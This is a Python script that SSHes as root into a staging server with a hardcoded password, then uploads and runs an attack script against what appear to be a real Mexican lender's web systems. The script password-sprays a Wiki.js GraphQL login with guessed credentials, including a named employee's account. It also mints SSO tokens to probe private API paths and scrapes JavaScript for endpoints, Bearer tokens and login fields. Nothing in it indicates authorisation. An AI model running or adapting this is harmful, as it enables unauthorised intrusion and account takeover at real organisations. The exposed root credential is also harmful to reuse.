import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, re, base64
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": UA, "Content-Type": "application/json"})

# ========================================
# 1. WIKI.JS GRAPHQL LOGIN
# ========================================
sys.stdout.write("=" * 60 + "\n=== WIKI.JS GRAPHQL LOGIN ===\n" + "=" * 60 + "\n\n")

WIKI = "https://wiki.findep.mx"

# Check GraphQL endpoint
r = s.post(f"{WIKI}/graphql", json={"query": "{ site { config { title } } }"}, timeout=10)
sys.stdout.write(f"GraphQL test: [{r.status_code}] {r.text[:500]}\n\n")

# Enumerate auth strategies
r = s.post(f"{WIKI}/graphql", json={"query": "{ authentication { activeStrategies { key strategy { key title description icon } isEnabled selfRegistration order config { key value } } } }"}, timeout=10)
sys.stdout.write(f"Auth strategies: [{r.status_code}] {r.text[:1000]}\n\n")

# Login attempts via GraphQL
CREDS = [
    ("jcruzval", "Fisa1234*"),
    ("jcruzval@findep.mx", "Fisa1234*"),
    ("jcruzval@independencia.com.mx", "Fisa1234*"),
    ("admin", "Fisa1234*"),
    ("admin", "admin"),
    ("admin@findep.mx", "admin"),
]

for user, pwd in CREDS:
    try:
        query = ("mutation { authentication { login("
                 "username: \"%s\", password: \"%s\", strategy: \"local\") {"
                 " responseResult { succeeded errorCode slug message } jwt"
                 " } } }") % (user.replace('"', '\\"'), pwd.replace('"', '\\"'))
        
        r = s.post(f"{WIKI}/graphql", json={"query": query}, timeout=10)
        data = r.json() if r.status_code == 200 else r.text
        
        tag = ""
        if isinstance(data, dict):
            login_data = data.get("data", {}).get("authentication", {}).get("login", {})
            result = login_data.get("responseResult", {})
            jwt_tok = login_data.get("jwt", "")
            if result.get("succeeded"):
                tag = " *** SUCCESS ***"
                if jwt_tok:
                    sys.stdout.write(f"\n  !!! JWT: {jwt_tok[:100]}...\n")
                    # Decode
                    parts = jwt_tok.split(".")
                    if len(parts) == 3:
                        pad = lambda ss: ss + "=" * (-len(ss) % 4)
                        payload = json.loads(base64.urlsafe_b64decode(pad(parts[1])))
                        sys.stdout.write(f"  JWT Payload: {json.dumps(payload, indent=2)}\n")
            sys.stdout.write(f"  {user}:{pwd} -> [{r.status_code}] {json.dumps(result)}{tag}\n")
        else:
            sys.stdout.write(f"  {user}:{pwd} -> [{r.status_code}] {str(data)[:300]}\n")
    except Exception as e:
        sys.stdout.write(f"  {user}:{pwd} -> ERR: {e}\n")
    sys.stdout.flush()

# Try to list users (admin only usually)
sys.stdout.write("\n=== WIKI USER LIST (unauthenticated) ===\n")
r = s.post(f"{WIKI}/graphql", json={"query": "{ users { list { id email name } } }"}, timeout=10)
sys.stdout.write(f"  [{r.status_code}] {r.text[:500]}\n")

# Site info
sys.stdout.write("\n=== WIKI SITE INFO ===\n")
for q in [
    "{ site { config { title host company contentLicense logoUrl } } }",
    "{ pages { list(orderBy: UPDATED) { id path title updatedAt } } }",
    "{ groups { list { id name permissions isSystem createdAt } } }",
    "{ analytics { providers { key isEnabled } } }",
    "{ localization { locales { code name } } }",
    "{ system { info { currentVersion latestVersion hostname os platform } } }",
]:
    try:
        r = s.post(f"{WIKI}/graphql", json={"query": q}, timeout=5)
        if r.status_code == 200 and "errors" not in r.text[:100]:
            sys.stdout.write(f"  OK: {r.text[:500]}\n")
        elif r.status_code == 200:
            err = json.loads(r.text).get("errors", [{}])[0].get("message", "")
            if err != "Access Denied":
                sys.stdout.write(f"  ERR: {err}\n")
    except:
        pass
    sys.stdout.flush()


# ========================================
# 2. HAWKING SWAGGER + NEXT DATA
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== HAWKING SWAGGER + NEXT_DATA ===\n" + "=" * 60 + "\n\n")

HAWK = "https://findep-hawking.tysonprod.com"

# Get __NEXT_DATA__ full
r = s.get(HAWK, timeout=10)
next_match = re.search(r'<script id="__NEXT_DATA__"[^>]*>(.*?)</script>', r.text, re.S)
if next_match:
    next_data = json.loads(next_match.group(1))
    sys.stdout.write(f"__NEXT_DATA__:\n{json.dumps(next_data, indent=2)[:5000]}\n\n")

# Swagger endpoints
for p in ["/swagger-ui", "/swagger-ui/", "/swagger-ui/index.html",
          "/swagger-ui.html", "/v2/api-docs", "/v3/api-docs",
          "/api-docs", "/openapi.json", "/openapi.yaml"]:
    try:
        r = s.get(f"{HAWK}{p}", timeout=5, allow_redirects=True)
        if r.status_code == 200 and len(r.text) > 50:
            sys.stdout.write(f"  [{r.status_code}] {p} ({len(r.text)}b)\n")
            sys.stdout.write(f"    {r.text[:1000]}\n\n")
        elif r.status_code not in [404]:
            sys.stdout.write(f"  [{r.status_code}] {p} ({len(r.text)}b)\n")
    except:
        pass
    sys.stdout.flush()

# API paths with minted token
sys.stdout.write("\n=== HAWKING API WITH SSO TOKEN ===\n")
r_tok = s.post("https://sso-jwt-token-service2.tysonprod.com/v1/sso_findep/get_new_token",
    json={"appJwt": "FINDEP-HAWKING", "serviceName": "hawking-service"}, timeout=10)
tok = r_tok.json().get("token", "")

paths = [
    "/api/v1/employees", "/api/v1/users", "/api/v1/clients",
    "/api/v1/loans", "/api/v1/credits", "/api/v1/branches",
    "/api/v1/catalogs", "/api/v1/products", "/api/v1/config",
    "/api/employees", "/api/users", "/api/clients",
    "/api/branches", "/api/catalogs",
    "/v1/employees", "/v1/users", "/v1/clients",
    "/v1/catalogs", "/v1/branches",
    "/api/health", "/api/info", "/api/version",
    "/_next/data/WUGcbW3nuhvNAcRH3vsDY/index.json",
]

for p in paths:
    try:
        r2 = s.get(f"{HAWK}{p}",
            headers={"Authorization": f"Bearer {tok}"},
            timeout=5, allow_redirects=False)
        if r2.status_code not in [404, 308]:
            sys.stdout.write(f"  [{r2.status_code}] {p} ({len(r2.text)}b) {r2.text[:200]}\n")
    except:
        pass
    sys.stdout.flush()


# ========================================
# 3. TYSONBETA - Extract config from JS
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== TYSONBETA CONFIG ===\n" + "=" * 60 + "\n\n")

r = s.get("https://findep.tysonbeta.com/", timeout=10)

# Extract all URLs
urls_found = re.findall(r'https?://[^\s"\'<>\\]+', r.text)
unique_urls = set()
for u in urls_found:
    u = u.rstrip(')')
    if any(x in u for x in ['findep', 'tyson', 'calidad', 'orquesta', 'independencia']):
        unique_urls.add(u)

sys.stdout.write("URLs found in TysonBeta:\n")
for u in sorted(unique_urls):
    sys.stdout.write(f"  {u}\n")

# Check for API calls in JS chunks
js_chunks = re.findall(r'src="(/_next/static/[^"]+)"', r.text)
sys.stdout.write(f"\nJS chunks: {len(js_chunks)}\n")

# Fetch pages/index chunk for API config
for chunk in js_chunks:
    if 'pages/index' in chunk or 'pages/_app' in chunk:
        try:
            r_js = s.get(f"https://findep.tysonbeta.com{chunk}", timeout=10)
            sys.stdout.write(f"\n  Chunk {chunk}: {len(r_js.text)}b\n")
            # Extract API URLs
            api_urls = re.findall(r'(?:baseURL|apiUrl|baseUrl|endpoint|NEXT_PUBLIC_API|API_URL|fetch\(|axios)["\s:=]+["\']?(https?://[^\s"\'<>]+)', r_js.text, re.I)
            for u in api_urls:
                sys.stdout.write(f"    API: {u}\n")
            # Extract other interesting strings
            for pattern in [r'"(https://[^"]*(?:api|service|auth|token)[^"]*)"', r'"(Bearer [^"]*)"']:
                matches = re.findall(pattern, r_js.text)
                for m in matches[:5]:
                    sys.stdout.write(f"    Found: {m[:120]}\n")
        except:
            pass
        sys.stdout.flush()


# ========================================
# 4. PPP - Analyze JS for login logic
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== PPP LOGIN JS ANALYSIS ===\n" + "=" * 60 + "\n\n")

# Get the khorComun.js.asp which likely has the login logic
try:
    r_js = s.get("https://ppp.findep.mx/khorComun.js.asp", timeout=10)
    sys.stdout.write(f"khorComun.js.asp: [{r_js.status_code}] {len(r_js.text)}b\n")
    
    # Find login-related functions
    login_funcs = re.findall(r'function\s+(\w*(?:login|Login|valida|Valida|entra|Entra|acceso|Acceso|sesion|Sesion|submit|Submit)[^{]*\{[^}]*\})', r_js.text, re.S)
    for f in login_funcs[:5]:
        sys.stdout.write(f"  Function: {f[:500]}\n")
    
    # Look for form field names
    field_refs = re.findall(r'(?:MM_findObj|getElementById|getElementsByName|querySelector)\(["\']([^"\']+)["\']', r_js.text)
    sys.stdout.write(f"\n  Field references: {set(field_refs)}\n")
    
    # Look for URLs
    url_refs = re.findall(r'(?:action|href|src|url|location)\s*[=:]\s*["\']([^"\']+)["\']', r_js.text)
    sys.stdout.write(f"  URL references: {set(url_refs)}\n")
    
    # Check for login POST logic
    if 'usr' in r_js.text or 'pwd' in r_js.text:
        # Get context around usr/pwd
        for match in re.finditer(r'.{0,100}(?:usr|pwd).{0,100}', r_js.text):
            sys.stdout.write(f"  Context: {match.group()}\n")
except Exception as e:
    sys.stdout.write(f"ERR: {e}\n")

# Get the full login page to find hidden usr/pwd fields
try:
    r_login = s.get("https://ppp.findep.mx/khorLogin.asp", timeout=10)
    # Find ALL input elements including those in JS-generated HTML
    all_inputs = re.findall(r'(?:input|INPUT)[^>]+(?:name|NAME)=["\']([^"\']+)["\']', r_login.text)
    sys.stdout.write(f"\nAll inputs in login page: {all_inputs}\n")
    
    # Find the part with usr/pwd
    usr_match = re.search(r'.{0,500}(?:usr|pwd|user|pass).{0,500}', r_login.text, re.I|re.S)
    if usr_match:
        sys.stdout.write(f"User/pass context: {usr_match.group()[:800]}\n")
except:
    pass


sys.stdout.write("\n\n=== ALL DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/wiki_hawk.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/wiki_hawk.py 2>&1', timeout=300)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
